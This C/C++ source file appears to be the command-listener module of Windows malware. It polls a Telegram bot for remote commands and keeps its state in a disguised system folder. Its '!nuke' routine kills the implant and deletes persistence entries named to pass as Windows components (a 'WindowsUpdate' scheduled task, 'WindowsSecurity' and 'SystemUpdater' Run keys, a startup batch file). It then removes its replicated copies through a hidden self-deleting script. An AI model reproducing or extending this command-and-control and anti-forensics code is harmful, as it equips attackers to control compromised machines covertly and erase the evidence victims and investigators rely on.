#include "../include/c2_listener.h"
#include "../include/telegram.h"

void SaveOffset(int offset) {
    CreateDirectoryA("C:\\ProgramData\\Microsoft\\Network", NULL);
    FILE* f = NULL;
    errno_t err = fopen_s(&f, OFFSET_FILE, "w");
    if (err == 0 && f) {
        fprintf(f, "%d\n", offset);
        fflush(f);
        fclose(f);
    }
}

int LoadOffset() {
    int offset = 0;
    FILE* f = NULL;
    errno_t err = fopen_s(&f, OFFSET_FILE, "r");
    if (err == 0 && f) {
        if (fscanf_s(f, "%d", &offset) != 1) {
            offset = 0;
        }
        fclose(f);
    }
    return offset;
}

char* PollTelegramCommand(int* offset) {
    char url[512];
    // Long polling (timeout=20 seconds) drastically reduces network polling requests
    sprintf_s(url, sizeof(url), "https://api.telegram.org/bot%s/getUpdates?offset=%d&timeout=20",
              get_token(), *offset);

    DWORD size;
    BYTE* data = DownloadURL(url, &size);
    if (!data || size == 0) return NULL;

    char* json = (char*)malloc(size + 1);
    if (!json) { free(data); return NULL; }
    memcpy(json, data, size);
    json[size] = 0;
    free(data);

    char* update_id_start = strstr(json, "\"update_id\":");
    if (update_id_start) {
        int newOffset = atoi(update_id_start + 12);
        if (newOffset >= *offset) *offset = newOffset + 1;
    }

    char* text_start = strstr(json, "\"text\":\"");
    if (text_start) {
        text_start += 8;
        char* text_end = strstr(text_start, "\"");
        if (text_end) {
            int len = (int)(text_end - text_start);
            char* cmd = (char*)malloc(len + 1);
            if (cmd) {
                memcpy(cmd, text_start, len);
                cmd[len] = 0;
                free(json);
                return cmd;
            }
        }
    }

    free(json);
    return NULL;
}

void NukeAll() {
    g_nukeInProgress = 1;
    SendTextToTelegram("🔥 NUKE initiated! Wiping all traces...");

    const char* exeName = strrchr(g_exePath, '\\');
    if (exeName) exeName++;
    else exeName = g_exePath;

    char killCmd[512];
    sprintf_s(killCmd, sizeof(killCmd), "taskkill /f /im \"%s\"", exeName);
    WinExec(killCmd, SW_HIDE);

    WinExec("schtasks /delete /tn \"WindowsUpdate\" /f", SW_HIDE);

    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsSecurity");
    RegDeleteKeyA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdater");

    char startupPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
        char batPath[MAX_PATH];
        sprintf_s(batPath, sizeof(batPath), "%s\\SecurityHelper.bat", startupPath);
        DeleteFileA(batPath);
    }

    char batSelfDestruct[MAX_PATH];
    GetTempPathA(MAX_PATH, batSelfDestruct);
    strcat_s(batSelfDestruct, sizeof(batSelfDestruct), "\\nuke_all.bat");
    FILE* f = fopen(batSelfDestruct, "w");
    if (f) {
        fprintf(f, "@echo off\n");
        fprintf(f, "timeout /t 2 /nobreak > nul\n");
        for (int i = 0; i < REPLICATION_COUNT; i++) {
            fprintf(f, "del /f /q \"%s\"\n", replicationPaths[i]);
        }
        fprintf(f, "del /f /q \"%s\"\n", g_exePath);
        fprintf(f, "del /f /q \"%%~f0\"\n");
        fclose(f);
    }

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    CreateProcessA(NULL, (LPSTR)batSelfDestruct, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    ExitProcess(0);
}

DWORD WINAPI CommandListenerThread(LPVOID lpParam) {
    while (g_running) {
        char* cmd = PollTelegramCommand(&g_telegramOffset);
        if (cmd) {
            SaveOffset(g_telegramOffset);
            if (strcmp(cmd, "!nuke") == 0) {
                free(cmd);
                HANDLE hNuke = CreateThread(NULL, 0, [](LPVOID) -> DWORD {
                    NukeAll();
                    return 0;
                }, NULL, 0, NULL);
                CloseHandle(hNuke);
                break;
            }
            free(cmd);
        }
        Sleep(2000);
    }
    return 0;
}
